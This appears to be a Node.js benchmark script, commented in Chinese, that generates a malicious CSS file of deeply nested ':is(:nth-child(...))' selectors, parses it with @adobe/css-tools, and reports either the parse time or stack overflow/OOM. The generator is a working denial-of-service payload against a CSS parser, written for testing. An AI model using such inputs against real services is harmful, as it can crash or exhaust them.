/**
 * bench_app.js
 *
 * 生成 normal.css 与恶意 :is(:nth-child()) 选择器，
 * 尝试解析，输出单个结果：
 *   - 若成功：毫秒数（浮点，保留 2 位）
 *   - 若栈溢出 / OOM：字符串 "OOM"
 *
 * DEPTH 通过环境变量传入，默认 800
 */
const { parse } = require('@adobe/css-tools');
const fs = require('fs');
const { performance } = require('perf_hooks');

const DEPTH = parseInt(process.env.DEPTH || '800', 10);

/* ---------- 生成 normal.css ---------- */
fs.writeFileSync('normal.css', 'body{margin:0}');

/* ---------- 生成恶意 evil.css ---------- */
let css = '';
for (let i = 0; i < DEPTH; ++i) css += ':is(:nth-child(1 of ';
css += 'a';
for (let i = 0; i < DEPTH; ++i) css += '))';
css += '{color:red}';
fs.writeFileSync('evil.css', css);

/* ---------- 解析函数，捕获栈溢出 ---------- */
function parseSafe(str) {
  try {
    parse(str);
    return true;
  } catch (e) {
    if (e instanceof RangeError || /out of memory/i.test(e.message)) {
      return false;              // 标记 OOM / 栈溢出
    }
    throw e;                      // 其他异常继续抛
  }
}

/* ---------- 计时 evil.css ---------- */
const data = fs.readFileSync('evil.css', 'utf8');
const t0 = performance.now();
const ok = parseSafe(data);
if (!ok) {
  console.log('OOM');             // 仅输出这一行
} else {
  const ms = (performance.now() - t0).toFixed(2);
  console.log(ms);                // 仅输出数字
}
